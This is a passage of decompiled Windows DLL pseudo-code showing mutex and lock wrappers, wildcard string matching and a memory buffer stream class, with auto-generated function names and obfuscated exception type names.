  *(_DWORD *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  return a1;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093D78: using guessed type int (__thiscall *off_10093D78)(void *Block, char);
// 100B7DEC: using guessed type wchar_t word_100B7DEC;
// 10017224: using guessed type int var_14[4];

//----- (10017292) --------------------------------------------------------
int *__thiscall sub_10017292(int *Block, char a2)
{
  sub_100172B1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100172B1) --------------------------------------------------------
LONG __thiscall sub_100172B1(int *this)
{
  LONG result; // eax

  *this = (int)&off_10093D78;
  result = sub_100141CF(this + 3);
  *this = (int)&off_10093D34;
  return result;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093D78: using guessed type int (__thiscall *off_10093D78)(void *Block, char);

//----- (100172E4) --------------------------------------------------------
_DWORD *__stdcall sub_100172E4(int a1)
{
  _DWORD *result; // eax

  result = sub_1001DB4C();
  if ( result )
    return (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(result[12] + 8))(result + 12, &a1);
  return result;
}

//----- (10017306) --------------------------------------------------------
_DWORD *__thiscall sub_10017306(int this)
{
  DWORD CurrentThreadId; // edi
  _DWORD *result; // eax

  CurrentThreadId = GetCurrentThreadId();
  result = (_DWORD *)InterlockedIncrement((volatile LONG *)(this + 28));
  if ( result )
  {
    if ( *(_DWORD *)(this + 24) == CurrentThreadId )
    {
      ++*(_DWORD *)(this + 32);
    }
    else
    {
      sub_10014E23(this + 12, -1, 0);
      *(_DWORD *)(this + 24) = CurrentThreadId;
      *(_DWORD *)(this + 32) = 1;
      return sub_100172E4(this);
    }
  }
  else
  {
    *(_DWORD *)(this + 24) = CurrentThreadId;
    *(_DWORD *)(this + 32) = 1;
    return sub_100172E4(this);
  }
  return result;
}

//----- (100173AF) --------------------------------------------------------
_DWORD *__thiscall sub_100173AF(int this)
{
  int *v2; // edi
  _DWORD *result; // eax
  int v5[6]; // [esp+10h] [ebp-18h] BYREF

  v5[1] = this;
  v5[5] = 0;
  v2 = (int *)(this + 28);
  result = (_DWORD *)InterlockedDecrement((volatile LONG *)(this + 28));
  if ( (*(_DWORD *)(this + 32))-- == 1 )
  {
    *(_DWORD *)(this + 24) = 0;
    result = sub_1001DB4C();
    if ( result )
    {
      v5[0] = this;
      result = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(result[12] + 12))(result + 12, v5);
    }
    if ( *v2 >= 0 )
      return (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)(this + 12) + 16))(this + 12);
  }
  return result;
}

//----- (10017417) --------------------------------------------------------
int __usercall sub_10017417@<eax>(int a1@<esi>)
{
  int result; // eax
  int v2; // ebx
  bool v3; // zf

  result = *(_DWORD *)(a1 + 28) - *(_DWORD *)(a1 + 32);
  v2 = 0;
  v3 = *(_DWORD *)(a1 + 28) == *(_DWORD *)(a1 + 32);
  *(_BYTE *)(a1 + 9) = 1;
  if ( result >= 0 && !v3 )
  {
    do
    {
      (*(void (__thiscall **)(int))(*(_DWORD *)(a1 + 12) + 16))(a1 + 12);
      result = *(_DWORD *)(a1 + 28) - *(_DWORD *)(a1 + 32);
      ++v2;
    }
    while ( v2 < result );
  }
  return result;
}

//----- (10017441) --------------------------------------------------------
int __stdcall sub_10017441(int a1)
{
  HANDLE MutexA; // eax
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  *(_DWORD *)a1 = &off_10093D34;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  pExceptionObject[5] = 0;
  *(_DWORD *)a1 = &off_10093D5C;
  MutexA = CreateMutexA(0, 0, 0);
  *(_DWORD *)(a1 + 12) = MutexA;
  if ( !MutexA )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return a1;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093D5C: using guessed type int (__thiscall *off_10093D5C)(void *Block, char);

//----- (100174A0) --------------------------------------------------------
HANDLE *__thiscall sub_100174A0(HANDLE *Block, char a2)
{
  sub_100175EC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100174BF) --------------------------------------------------------
int __stdcall sub_100174BF(int a1, int a2, int a3, char a4, struct _SECURITY_ATTRIBUTES *a5)
{
  *(_DWORD *)a1 = &off_10093D34;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  *(_DWORD *)a1 = &off_10093D5C;
  sub_10017507(a1, a3, a2, a4, a5);
  return a1;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093D5C: using guessed type int (__thiscall *off_10093D5C)(void *Block, char);

//----- (10017507) --------------------------------------------------------
LONG __userpurge sub_10017507@<eax>(int a1@<esi>, int a2, int a3, char a4, LPSECURITY_ATTRIBUTES lpMutexAttributes)
{
  _DWORD *v5; // eax
  HANDLE v6; // eax
  HANDLE MutexW; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-30h] BYREF
  int v10[2]; // [esp+1Ch] [ebp-24h] BYREF
  int v11; // [esp+24h] [ebp-1Ch] BYREF
  int v12; // [esp+28h] [ebp-18h]
  int v13; // [esp+2Ch] [ebp-14h]
  int v14; // [esp+3Ch] [ebp-4h]

  v5 = (_DWORD *)a2;
  v13 = 0;
  if ( a4 )
  {
    v5 = sub_100142A3(v10, a2);
    v14 = 0;
    v13 = 1;
  }
  sub_1000CE26(&v11, (int)v5);
  v14 = 2;
  if ( (v13 & 1) != 0 )
  {
    v13 &= ~1u;
    sub_1000CE59(v10);
  }
  if ( a3 == 1 || a3 == 17 )
  {
    MutexW = CreateMutexW(lpMutexAttributes, 0, *(LPCWSTR *)(v12 + 12));
    *(_DWORD *)(a1 + 12) = MutexW;
    if ( MutexW )
      goto LABEL_15;
    if ( a3 != 17 || GetLastError() != 5 )
    {
LABEL_9:
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  else if ( a3 != 16 )
  {
    sub_10016441(&a4);
    _CxxThrowException(&a4, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = OpenMutexW(0x100001u, 0, *(LPCWSTR *)(v12 + 12));
  *(_DWORD *)(a1 + 12) = v6;
  if ( !v6 )
    goto LABEL_9;
LABEL_15:
  v14 = -1;
  return sub_1000CE59(&v11);
}
// 10017507: using guessed type _DWORD pExceptionObject[3];

//----- (100175EC) --------------------------------------------------------
BOOL __thiscall sub_100175EC(HANDLE *this)
{
  BOOL result; // eax

  *this = &off_10093D5C;
  result = CloseHandle(this[3]);
  *this = &off_10093D34;
  return result;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093D5C: using guessed type int (__thiscall *off_10093D5C)(void *Block, char);

//----- (10017637) --------------------------------------------------------
char __cdecl sub_10017637(int a1)
{
  const WCHAR *v1; // ebx
  HANDLE v2; // eax
  DWORD v4; // [esp-8h] [ebp-44h]
  int CurrentProcessId; // [esp-4h] [ebp-40h]
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-2Ch] BYREF
  int v7[2]; // [esp+1Ch] [ebp-20h] BYREF
  _DWORD v8[5]; // [esp+24h] [ebp-18h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v8[2] = 0;
  sub_1000CE26(v7, a1);
  v9 = 2;
  v1 = *(const WCHAR **)(v7[1] + 12);
  CurrentProcessId = GetCurrentProcessId();
  v4 = GetCurrentProcessId();
  v2 = OpenMutexW(0x100000u, 0, v1);
  sub_10029136(v8, v2, 0, 0, v4, CurrentProcessId);
  LOBYTE(v9) = 3;
  if ( v8[1] )
  {
    LOBYTE(v9) = 2;
    sub_10014389(v8);
    v9 = -1;
    sub_1000CE59(v7);
    return 1;
  }
  else
  {
    if ( GetLastError() != 2 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
    LOBYTE(v9) = 2;
    sub_10014389(v8);
    v9 = -1;
    sub_1000CE59(v7);
    return 0;
  }
}
// 10017637: using guessed type _DWORD pExceptionObject[3];

//----- (100176EB) --------------------------------------------------------
DWORD __thiscall sub_100176EB(int this)
{
  int *p_pExceptionObject; // eax
  DWORD result; // eax
  _ThrowInfo *v4; // [esp-4h] [ebp-18h]
  _DWORD v5[3]; // [esp+4h] [ebp-10h] BYREF
  int pExceptionObject; // [esp+10h] [ebp-4h] BYREF

  if ( *(_BYTE *)(this + 9) )
    goto LABEL_2;
  result = sub_10029CE2(*(HANDLE *)(this + 12), 0xFFFFFFFF);
  if ( result == 128 )
  {
    *(_BYTE *)(this + 9) = 1;
LABEL_2:
    sub_1002A2DB(&pExceptionObject);
    v4 = (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__;
    p_pExceptionObject = &pExceptionObject;
    goto LABEL_3;
  }
  if ( result )
  {
    sub_100167F9(v5, 1);
    p_pExceptionObject = v5;
LABEL_3:
    _CxxThrowException(p_pExceptionObject, v4);
  }
  return result;
}
// 1001770C: variable 'v4' is possibly undefined
// 100176EB: using guessed type _DWORD var_10[3];

//----- (10017745) --------------------------------------------------------
char __thiscall sub_10017745(void *this, DWORD pExceptionObject)
{
  char result; // al

  result = sub_100177C3((int)this, pExceptionObject);
  if ( !result )
  {
    sub_1002A32D(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVBtedofbPwtdhdgkk_bjxssd_sr__);
  }
  return result;
}

//----- (100177C3) --------------------------------------------------------
char __userpurge sub_100177C3@<al>(int a1@<esi>, DWORD pExceptionObject)
{
  DWORD v2; // eax
  _DWORD v4[3]; // [esp+0h] [ebp-Ch] BYREF

  if ( *(_BYTE *)(a1 + 9) )
  {
LABEL_2:
    sub_1002A2DB(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__);
  }
  v2 = sub_10029CE2(*(HANDLE *)(a1 + 12), pExceptionObject);
  if ( v2 == 258 )
    return 0;
  if ( v2 == 128 )
  {
    *(_BYTE *)(a1 + 9) = 1;
    goto LABEL_2;
  }
  if ( v2 )
  {
    sub_100167F9(v4, 1);
    _CxxThrowException(v4, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  ++*(_DWORD *)(a1 + 4);
  return 1;
}
// 100177C3: using guessed type _DWORD var_C[3];

//----- (1001782C) --------------------------------------------------------
bool __thiscall sub_1001782C(_BYTE *this)
{
  _BYTE *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( this[9] )
  {
    sub_1002A2DB(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__);
  }
  return sub_100177C3((int)this, 0) != 0;
}

//----- (1001785F) --------------------------------------------------------
BOOL __thiscall sub_1001785F(HANDLE *this)
{
  BOOL result; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  result = ReleaseMutex(this[3]);
  if ( !result )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 1001785F: using guessed type _DWORD pExceptionObject[3];

//----- (1001788C) --------------------------------------------------------
int __thiscall sub_1001788C(_DWORD *this)
{
  return this[3];
}

//----- (10017890) --------------------------------------------------------
char __thiscall sub_10017890(_BYTE *this)
{
  if ( this[9] )
    return 1;
  if ( (*(unsigned __int8 (__thiscall **)(_BYTE *))(*(_DWORD *)this + 20))(this) )
    sub_10017063((int)this);
  return 0;
}

//----- (100178DB) --------------------------------------------------------
int __stdcall sub_100178DB(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10093D34;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 0;
  *(_BYTE *)(a1 + 9) = 0;
  *(_DWORD *)a1 = &off_10093D88;
  return result;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093D88: using guessed type int (__thiscall *off_10093D88)(void *Block, char);

//----- (10017910) --------------------------------------------------------
_DWORD *__thiscall sub_10017910(_DWORD *Block, char a2)
{
  sub_1001792F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001792F) --------------------------------------------------------
void __thiscall sub_1001792F(_DWORD *this)
{
  *this = &off_10093D88;
  *this = &off_10093D34;
}
// 10093D34: using guessed type int (__thiscall *off_10093D34)(void *Block, char);
// 10093D88: using guessed type int (__thiscall *off_10093D88)(void *Block, char);

//----- (1001795D) --------------------------------------------------------
_DWORD *__thiscall sub_1001795D(_DWORD *Block, char a2)
{
  *Block = off_10093D98;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10093D98: using guessed type int (__thiscall *off_10093D98[2])(void *Block, char);

//----- (1001797D) --------------------------------------------------------
char __cdecl sub_1001797D(int a1, int a2, int a3, int a4)
{
  char v4; // bl
  unsigned int v5; // edi
  unsigned int v6; // eax
  unsigned int v8; // [esp+10h] [ebp-14h]
  char i; // [esp+17h] [ebp-Dh]

  v4 = 1;
  v5 = 0;
  v8 = 0;
  for ( i = 0; v5 < *(_DWORD *)(a2 + 28); ++v5 )
  {
    if ( *(_WORD *)sub_1000CF9F(&a1, v5) == 42 )
      i = 1;
    if ( *(_WORD *)sub_1000CF9F(&a1, v5) == 63 )
      ++v8;
  }
  v6 = *(_DWORD *)(a4 + 28);
  if ( v8 != v6 && (!i || v8 > v6) )
    v4 = 0;
  sub_1000CE59(&a1);
  sub_1000CE59(&a3);
  return v4;
}

//----- (10017A05) --------------------------------------------------------
_DWORD *__cdecl sub_10017A05(_DWORD *a1, unsigned int *a2, int a3, int a4)
{
  unsigned int v4; // edi
  unsigned int v5; // ebx
  bool v6; // zf
  _DWORD *v7; // eax
  rsize_t v9; // [esp-4h] [ebp-3Ch]
  int v10[2]; // [esp+10h] [ebp-28h] BYREF
  int v11; // [esp+18h] [ebp-20h]
  int v12; // [esp+1Ch] [ebp-1Ch] BYREF
  unsigned int v13; // [esp+20h] [ebp-18h]
  unsigned int v14; // [esp+24h] [ebp-14h]
  unsigned int v15; // [esp+28h] [ebp-10h]
  int v16; // [esp+34h] [ebp-4h]

  v4 = 0;
  v11 = 0;
  v16 = 1;
  v5 = 0;
  v6 = *(_DWORD *)(a4 + 28) == 0;
  v15 = 0;
  v13 = 0;
  v14 = 0;
  if ( !v6 )
  {
    do
    {
      if ( *(_WORD *)sub_1000CF9F(&a3, v4) == 63 || *(_WORD *)sub_1000CF9F(&a3, v4) == 42 )
      {
        if ( v15 > v14 )
        {
          v5 = v13;
          v14 = v15;
        }
        v15 = 0;
        v13 = v4 + 1;
      }
      else
      {
        ++v15;
      }
      ++v4;
    }
    while ( v4 < *(_DWORD *)(a4 + 28) );
    if ( v15 > v14 )
    {
      v5 = v13;
      v14 = v15;
    }
  }
  v9 = v14;
  *a2 = v5;
  v7 = sub_1000D2DE((int)&a3, v5, &v12, v9);
  LOBYTE(v16) = 2;
  sub_10012A7C(v10, (int)v7);
  LOBYTE(v16) = 4;
  sub_1000CE59(&v12);
  sub_1000CE26(a1, (int)v10);
  v11 = 1;
  LOBYTE(v16) = 1;
  sub_10012AAC(v10);
  LOBYTE(v16) = 0;
  sub_10012AAC(&a3);
  return a1;
}

//----- (10017AE1) --------------------------------------------------------
char __cdecl sub_10017AE1(int a1, int a2, int a3, int a4)
{
  bool v4; // bl
  int v5; // ecx
  int v6; // ecx
  char v7; // bl
  int v9; // esi
  rsize_t v10; // edi
  int v11; // ecx
  int v12; // ecx
  int v13; // ecx
  int v14; // ecx
  int v15; // [esp-8h] [ebp-60h] BYREF
  int v16; // [esp-4h] [ebp-5Ch]
  int v17; // [esp+0h] [ebp-58h] BYREF
  int v18; // [esp+4h] [ebp-54h]
  int v19[2]; // [esp+18h] [ebp-40h] BYREF
  int v20[2]; // [esp+20h] [ebp-38h] BYREF
  int v21[2]; // [esp+28h] [ebp-30h] BYREF
  int v22[2]; // [esp+30h] [ebp-28h] BYREF
  int v23; // [esp+38h] [ebp-20h] BYREF
  int v24; // [esp+3Ch] [ebp-1Ch]
  int *v25; // [esp+40h] [ebp-18h]
  int *v26; // [esp+44h] [ebp-14h] BYREF
  int v27; // [esp+54h] [ebp-4h]

  v27 = 1;
  v26 = &v17;
  sub_10017D30(&v17, (int)&a1);
  LOBYTE(v27) = 1;
  sub_10017A05(&v23, (unsigned int *)&v26, v17, v18);
  LOBYTE(v27) = 3;
  sub_1000CC20(v19, &word_100B7DE8);
  LOBYTE(v27) = 4;
  v4 = sub_1000D0B5((int)v19, (int)&v23) == 0;
  LOBYTE(v27) = 3;
  sub_1000CE59(v19);
  if ( v4 )
  {
    v18 = v5;
    v17 = v5;
    v26 = &v17;
    sub_1000CE26(&v17, (int)&a3);
    LOBYTE(v27) = 5;
    v16 = v6;
    v15 = v6;
    v25 = &v15;
    sub_1000CE26(&v15, (int)&a1);
    LOBYTE(v27) = 3;
    v7 = sub_1001797D(v15, v16, v17, v18);
  }
  else if ( !*(_DWORD *)(a4 + 28) || (v9 = sub_1000D8AA((int)&v23, (int)&a3, 0), v9 == -1) )
  {
LABEL_5:
    v7 = 0;
  }
  else
  {
    v10 = (rsize_t)v26;
    while ( 1 )
    {
      sub_1000D2DE((int)&a3, 0, v19, v9);
      LOBYTE(v27) = 7;
      sub_1000D2DE((int)&a1, 0, v20, v10);
      LOBYTE(v27) = 8;
      sub_1000D2DE((int)&a3, *(_DWORD *)(v24 + 28) + v9, v21, 0xFFFFFFFE);
      LOBYTE(v27) = 9;
      sub_1000D2DE((int)&a1, *(_DWORD *)(v24 + 28) + v10, v22, 0xFFFFFFFE);
      LOBYTE(v27) = 10;
      v18 = v11;
      v17 = v11;
      v25 = &v17;
      sub_10012A7C(&v17, (int)v19);
      LOBYTE(v27) = 11;
      v16 = v12;
      v15 = v12;
      v26 = &v15;
      sub_10012A7C(&v15, (int)v20);
      LOBYTE(v27) = 10;
      if ( (unsigned __int8)sub_10017AE1(v15, v16, v17, v18) )
      {
        v18 = v13;
        v17 = v13;
        v25 = &v17;
        sub_10012A7C(&v17, (int)v21);
        LOBYTE(v27) = 13;
        v16 = v14;
        v15 = v14;
        v26 = &v15;
        sub_10012A7C(&v15, (int)v22);
        LOBYTE(v27) = 10;
        if ( (unsigned __int8)sub_10017AE1(v15, v16, v17, v18) )
          break;
      }
      LOBYTE(v27) = 9;
      sub_1000CE59(v22);
      LOBYTE(v27) = 8;
      sub_1000CE59(v21);
      LOBYTE(v27) = 7;
      sub_1000CE59(v20);
      LOBYTE(v27) = 3;
      sub_1000CE59(v19);
      v9 = sub_1000D8AA((int)&v23, (int)&a3, v9 + 1);
      if ( v9 == -1 )
        goto LABEL_5;
    }
    LOBYTE(v27) = 9;
    sub_1000CE59(v22);
    LOBYTE(v27) = 8;
    sub_1000CE59(v21);
    LOBYTE(v27) = 7;
    sub_1000CE59(v20);
    LOBYTE(v27) = 3;
    sub_1000CE59(v19);
    v7 = 1;
  }
  LOBYTE(v27) = 1;
  sub_1000CE59(&v23);
  LOBYTE(v27) = 0;
  sub_10012AAC(&a1);
  v27 = -1;
  sub_10012AAC(&a3);
  return v7;
}
// 10017B56: variable 'v5' is possibly undefined
// 10017B6B: variable 'v6' is possibly undefined
// 10017C38: variable 'v11' is possibly undefined
// 10017C4D: variable 'v12' is possibly undefined
// 10017C72: variable 'v13' is possibly undefined
// 10017C87: variable 'v14' is possibly undefined
// 100B7DE8: using guessed type wchar_t word_100B7DE8;

//----- (10017D30) --------------------------------------------------------
_DWORD *__stdcall sub_10017D30(_DWORD *a1, int a2)
{
  sub_1000CE26(a1, a2);
  *a1 = off_10093C38;
  return a1;
}
// 10093C38: using guessed type int (__thiscall *off_10093C38[3])(void *Block, char);

//----- (10017D60) --------------------------------------------------------
_DWORD *__stdcall sub_10017D60(_DWORD *a1)
{
  sub_10017FF0((int)a1);
  *a1 = &off_10093D9C;
  sub_10016983(0, (int)(a1 + 2), 0);
  a1[7] = 0;
  a1[8] = 0;
  return a1;
}
// 10093D9C: using guessed type int (__thiscall *off_10093D9C)(void *Block, char);

//----- (10017DA4) --------------------------------------------------------
void *__thiscall sub_10017DA4(void *Block, char a2)
{
  sub_10017DC3((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10017DC3) --------------------------------------------------------
int __thiscall sub_10017DC3(int this)
{
  *(_DWORD *)this = &off_10093D9C;
  sub_10018085((_BYTE *)this);
  sub_10016B53((int *)(this + 8));
  return sub_1001803E((_BYTE *)this);
}
// 10093D9C: using guessed type int (__thiscall *off_10093D9C)(void *Block, char);

//----- (10017E1B) --------------------------------------------------------
unsigned int __thiscall sub_10017E1B(_DWORD *this, char a2)
{
  unsigned int result; // eax

  if ( this[8] == this[7] )
    (*(void (__thiscall **)(_DWORD *, int))(*this + 40))(this, 1);
  *(_BYTE *)sub_10016C51((int)(this + 2), this[8]) = a2;
  result = ++this[8];
  if ( result > this[7] )
    this[7] = result;
  return result;
}

//----- (10017E53) --------------------------------------------------------
int __thiscall sub_10017E53(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // edi
  unsigned int v4; // eax
  int v5; // eax
  int result; // eax
  bool v7; // cc
  const void *v8; // [esp-8h] [ebp-14h]
  size_t v9; // [esp-4h] [ebp-10h]

  v3 = this[8] + a2[3];
  v4 = this[7];
  if ( v3 > v4 )
    (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 40))(this, v3 - v4);
  v9 = a2[3];
  v8 = (const void *)sub_10016C24(a2);
  v5 = sub_10016C00(this + 2);
  memcpy((void *)(this[8] + v5), v8, v9);
  result = this[3];
  *(_BYTE *)(result + 8) = 1;
  v7 = v3 <= this[7];
  this[8] = v3;
  if ( !v7 )
    this[7] = v3;
  return result;
}

//----- (10017EAF) --------------------------------------------------------
int __thiscall sub_10017EAF(int *this, int a2)
{
  sub_10016DFF(this[7], this + 2, a2, 0);
  return a2;
}

//----- (10017EE5) --------------------------------------------------------
int __thiscall sub_10017EE5(_DWORD *this)
{
  return this[8];
}

//----- (10017EE9) --------------------------------------------------------
int __thiscall sub_10017EE9(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[8];
    }
    else if ( a3 == 2 )
    {
      v3 = this[7];
    }
  }
  else
  {
    v3 = 0;
  }
  result = a2 + v3;
  if ( result < 0 || result > this[7] )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  this[8] = result;
  return result;
}
// 10017EE9: using guessed type _DWORD pExceptionObject[2];

//----- (10017F34) --------------------------------------------------------
char *__thiscall sub_10017F34(_DWORD *this, char *a2)
{
  int *v3; // eax
  char *result; // eax
  int v5[7]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  if ( !this[7] )
  {
    v3 = (int *)sub_10016983(a2, (int)v5, 0);
    v6 = 0;
    sub_10016B2F(v3, (int)(this + 2));
    v6 = -1;
    sub_10016B53(v5);
  }
  while ( 1 )
  {
    result = &a2[this[7]];
    if ( (unsigned int)result <= this[5] )
      break;
    (*(void (__thiscall **)(_DWORD *))(*this + 44))(this);
  }
  return result;
}
// 10017F34: using guessed type int var_20[7];

//----- (10017F8B) --------------------------------------------------------
LONG __thiscall sub_10017F8B(_DWORD *this)
{
  void *v2; // eax
  const void *v4; // [esp-8h] [ebp-38h]
  size_t v5; // [esp-4h] [ebp-34h]
  int v6[7]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  sub_10016983((void *)(2 * this[5]), (int)v6, 0);
  v7 = 0;
  v5 = this[7];
  v4 = (const void *)sub_10016C24(this + 2);
  v2 = (void *)sub_10016C00(v6);
  memcpy(v2, v4, v5);
  *(_BYTE *)(v6[1] + 8) = 1;
  sub_10016B2F(v6, (int)(this + 2));
  v7 = -1;
  return sub_10016B53(v6);
}

//----- (10017FED) --------------------------------------------------------
char sub_10017FED()
{
  return 1;
}

//----- (10017FF0) --------------------------------------------------------
int __stdcall sub_10017FF0(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10094B24;
  *(_DWORD *)a1 = &off_10093DCC;
  *(_BYTE *)(a1 + 4) = 0;
  return result;
}
// 10093DCC: using guessed type int (__thiscall *off_10093DCC)(void *Block, char);
// 10094B24: using guessed type int (__thiscall *off_10094B24)(void *Block, char);

//----- (1001801F) --------------------------------------------------------
_BYTE *__thiscall sub_1001801F(_BYTE *Block, char a2)
{
  sub_1001803E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001803E) --------------------------------------------------------
int __thiscall sub_1001803E(_BYTE *this)
{
  int result; // eax

  *(_DWORD *)this = &off_10093DCC;
  result = sub_10018085(this);
  *(_DWORD *)this = &off_10094B24;
  return result;
}
// 10093DCC: using guessed type int (__thiscall *off_10093DCC)(void *Block, char);
// 10094B24: using guessed type int (__thiscall *off_10094B24)(void *Block, char);

//----- (10018085) --------------------------------------------------------
int __thiscall sub_10018085(_BYTE *this)
{
  int result; // eax

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 28))(this);
  if ( !(_BYTE)result )
    this[4] = 1;
  return result;
}

//----- (10018098) --------------------------------------------------------
char __thiscall sub_10018098(_BYTE *this)
{
  return this[4];
}

//----- (1001809C) --------------------------------------------------------
int __thiscall sub_1001809C(void *this, _DWORD *a2)
{
  unsigned int v2; // ebx
  unsigned int i; // edi
  int result; // eax

  v2 = a2[3];
  for ( i = 0; i < v2; ++i )
    result = (*(int (__thiscall **)(void *, _DWORD))(*(_DWORD *)this + 16))(
               this,
               *(unsigned __int8 *)(a2[2] + *(_DWORD *)(a2[1] + 12) + i));
  return result;
}

//----- (100180D4) --------------------------------------------------------
_DWORD *__stdcall sub_100180D4(_DWORD *a1, int a2)
{
  *a1 = off_10093DF0;
  a1[1] = a2;
  sub_10013FBB(a1 + 2);
  sub_1001400B(a1 + 4);
  a1[6] = 0;
  a1[7] = 0;
  sub_1001A75A((int)(a1 + 8));
  sub_1001A656((int)(a1 + 10));
  return a1;
}
// 10093DF0: using guessed type int (__cdecl *off_10093DF0[2])(int, int);

//----- (10018133) --------------------------------------------------------
int __thiscall sub_10018133(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v2 = (***(int (__thiscall ****)(_DWORD))(this + 4))(*(_DWORD *)(this + 4));
  if ( v2 != *(_DWORD *)(this + 24) )
  {
    *(_DWORD *)(this + 24) = v2;
    v3 = operator new(0x28u);
    if ( v3 )
      v4 = sub_1002A3AD(v3, *(_DWORD *)(this + 24), this + 40);
    else
      v4 = 0;
    sub_1001405B((_DWORD *)(this + 8), (int)v4);
  }
  return *(_DWORD *)(this + 8);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001818B) --------------------------------------------------------
int __thiscall sub_1001818B(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 != *(_DWORD *)(this + 28) )
  {
    *(_DWORD *)(this + 28) = v2;
    v3 = operator new(0x3Cu);
    if ( v3 )
      v4 = sub_1002A570(v3, *(_DWORD *)(this + 28), this + 32);
    else
      v4 = 0;
    sub_1001409E((_DWORD *)(this + 16), (int)v4);
  }
  return *(_DWORD *)(this + 16);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100181FC) --------------------------------------------------------
int __thiscall sub_100181FC(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 20))(this[1]);
}

//----- (10018208) --------------------------------------------------------
int __thiscall sub_10018208(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 24))(this[1]);
}

//----- (10018210) --------------------------------------------------------
int __thiscall sub_10018210(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 28))(this[1]);
}

//----- (1001821C) --------------------------------------------------------
int __thiscall sub_1001821C(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 32))(this[1]);
}

//----- (10018224) --------------------------------------------------------
int __thiscall sub_10018224(_DWORD **this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(*this[1] + 36))(this[1], a2);
  return a2;
}

//----- (10018255) --------------------------------------------------------
_DWORD *__stdcall sub_10018255(_DWORD *a1, int a2, volatile LONG *lpAddend, int a4, int a5)
{
  volatile LONG *v5; // eax
  int v6; // ecx
  _DWORD *v7; // eax
  int v9[2]; // [esp+10h] [ebp-18h] BYREF
  int v10; // [esp+18h] [ebp-10h]
  int v11; // [esp+24h] [ebp-4h]

  v10 = 0;
  v11 = 1;
  sub_1001833D((int)a1);
